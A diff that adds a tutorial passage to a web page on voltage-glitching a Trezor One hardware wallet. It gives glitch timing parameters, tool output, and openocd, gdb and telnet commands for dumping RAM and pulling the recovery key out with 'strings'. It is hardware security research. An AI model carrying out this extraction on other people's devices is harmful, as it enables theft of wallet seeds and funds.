@@ -173,7 +173,130 @@
 
                                         <p>It is important not to connect the Trezor One to a computer via USB during glitching.</p>
 
-                                        
+                                        <div class="paddingTop15 paddingBottom15 kesenheimer-headline">
+                                            <div>
+                                                <h2>Voltage Traces</h2>
+                                            </div>
+                                        </div>
+
+                                        <p>The startup sequence of the STM32F205 can now be verified by measuring the voltage traces during startup:</p>
+
+                                        <div class="paddingTop0 paddingBottom30 kesenheimer-image">
+                                            <figure>
+                                                <img title="" alt="" src="/Resources/Persistent/2025/10/images/10-startup.bmp" width="3264" height="2448" />
+                                            </figure>
+                                        </div>
+
+                                        <p>The level of the voltage supply should slowly rise in comparison to the voltage on the 'V_CAP' line. Furthermore, the voltage output on the 'VCAP' line is delayed approximately 150ms after the device is powered on. Powering the device and measuring the voltage traces can be done with the command:</p>
+
+                                        <div class="paddingTop0 paddingBottom30 kesenheimer-code">
+                                            <pre class="line-numbers-rows">
+                                                <code class="language-php">power-on --rpico /dev/<tty-device></code>
+                                            </pre>
+                                        </div>
+
+                                        <div class="paddingTop15 paddingBottom15 kesenheimer-headline">
+                                            <div>
+                                                <h2>Glitching</h2>
+                                            </div>
+                                        </div>
+
+                                        <p>Now everything is set up, we can start glitching our device. For this, the script 'stm32f2-boot-debugger.py' has been prepared. This script powers up the device, waits for the trigger signal on input 'EXT1', waits a given delay and emits a glitch of a certain length. Afterwards, it is tested if memory can be read from RAM.</p>
+
+                                        <div class="paddingTop0 paddingBottom30 kesenheimer-image">
+                                            <figure>
+                                                <img title="" alt="" src="/Resources/Persistent/2025/10/images/11-vcap-power-trace.bmp" width="3264" height="2448" />
+                                            </figure>
+                                        </div>
+
+                                        <p>Successful glitches should be found about 176us after the 'VCAP' line comes up. Start by searching a wider parameter space and reduce the parameter space when the first positive events are observed. The glitch length is not critical, but in general shorter glitches are preferable.</p>
+
+                                        <div class="paddingTop0 paddingBottom30 kesenheimer-code">
+                                            <pre class="line-numbers-rows">
+                                                <code class="language-php">python stm32f2-boot-debugger.py --rpico /dev/<tty-device> --length 100 500 --delay 175_600 176_700 --halt [--resume]</code>
+                                            </pre>
+                                        </div>
+
+                                        <p>We can use the 'analyzer' from 'findus' to analyze the glitch parameters:</p>
+
+                                        <div class="paddingTop0 paddingBottom30 kesenheimer-code">
+                                            <pre class="line-numbers-rows">
+                                                <code class="language-php">analyzer --directory databases --auto-update 60</code>
+                                            </pre>
+                                        </div>
+
+                                        <div class="paddingTop0 paddingBottom30 kesenheimer-image">
+                                            <figure>
+                                                <img title="" alt="" src="/Resources/Persistent/2025/10/images/12-parameterspace.png" width="3264" height="2448" />
+                                            </figure>
+                                        </div>
+
+                                        <p>When the script is stopped (when a successful glitch is detected), further instructions are printed to the terminal:</p>
+
+                                        <div class="paddingTop0 paddingBottom30 kesenheimer-code">
+                                            <pre class="line-numbers-rows">
+                                                <code class="language-php">
+[+] Experiment 158	12914	(3)	176526	126	R	b'success: read zero'
+[+] Now connect the Trezor One via USB with your computer and go to the Trezor Suite app.
+    Wait for the Trezor One to connect. Do not abort this script!
+    If the pin input on the Trezor comes up, execute the following command to dump the memory:
+    $ openocd -f interface/stlink.cfg -c "transport select hla_swd" -f target/stm32f4x.cfg -c "init; reset run"
+    Connect to openocd via gdb or telnet:
+    $ telnet localhost 4444
+    $ arm-none-eabi-gdb
+    (gdb) target remote :3333
+    (gdb) monitor reset halt
+    (gdb) continue
+    Or dump the RAM as is with the following command:
+    $ openocd -f interface/stlink.cfg -c "transport select hla_swd" -f target/stm32f4x.cfg -c "init; dump_image ram.bin 0x20000000 0x1fffffff; exit"
+                                                </code>
+                                            </pre>
+                                        </div>
+
+                                        <p>In this state, we can either try to dump the RAM contents:</p>
+
+                                        <div class="paddingTop0 paddingBottom30 kesenheimer-code">
+                                            <pre class="line-numbers-rows">
+                                                <code class="language-php">openocd -f interface/stlink.cfg -c "transport select hla_swd" -f target/stm32f4x.cfg -c "init; dump_image ram.bin 0x20000000 0x1fffffff; exit"</code>
+                                            </pre>
+                                        </div>
+
+                                        <p>Or we can connect to the device via telnet or gdb. First, a debug connection with openocd is initialized:</p>
+
+                                        <div class="paddingTop0 paddingBottom30 kesenheimer-code">
+                                            <pre class="line-numbers-rows">
+                                                <code class="language-php">openocd -f interface/stlink.cfg -c "transport select hla_swd" -f target/stm32f4x.cfg -c "init; reset run"</code>
+                                            </pre>
+                                        </div>
+
+                                        <p>Then we connect to the device via telnet:</p>
+
+                                        <div class="paddingTop0 paddingBottom30 kesenheimer-code">
+                                            <pre class="line-numbers-rows">
+                                                <code class="language-php">telnet localhost 4444</code>
+                                            </pre>
+                                        </div>
+
+                                        <p>Or GDB:</p>
+
+                                        <div class="paddingTop0 paddingBottom30 kesenheimer-code">
+                                            <pre class="line-numbers-rows">
+                                                <code class="language-php">
+arm-none-eabi-gdb
+(gdb) target remote :3333
+(gdb) monitor reset halt
+(gdb) continue
+                                                </code>
+                                            </pre>
+                                        </div>
+
+                                        <p>By dumping the RAM in this state, the recovery key should be visible in the dump. Observe the RAM dump with the 'strings' command:</p>
+
+                                        <div class="paddingTop0 paddingBottom30 kesenheimer-code">
+                                            <pre class="line-numbers-rows">
+                                                <code class="language-php">strings ram.bin</code>
+                                            </pre>
+                                        </div>
                                     </div>
                                 </div>
                             </div>
